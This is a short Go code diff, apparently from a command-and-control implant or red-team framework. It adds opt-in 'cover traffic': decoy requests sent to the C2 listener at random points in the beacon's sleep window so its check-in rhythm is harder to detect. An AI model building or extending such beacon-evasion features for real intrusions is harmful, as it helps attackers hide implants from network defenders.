@@ -613,6 +613,18 @@ func waitForBeaconWake(duration time.Duration) {
 	if duration < 0 {
 		duration = 0
 	}
+	// Cover traffic: sprinkle decoy requests to the C2 listener at a random
+	// point inside the sleep window so the beacon cadence is less regular.
+	// getActiveCoverTraffic() returns false unless an operator opted in.
+	if duration > 0 {
+		if enabled, _ := getActiveCoverTraffic(); enabled {
+			go func() {
+				d := time.Duration(mathRand.Int63n(int64(duration)))
+				time.Sleep(d)
+				sendCoverTrafficBurst()
+			}()
+		}
+	}
 	timer := time.NewTimer(duration)
 	defer timer.Stop()
 	select {
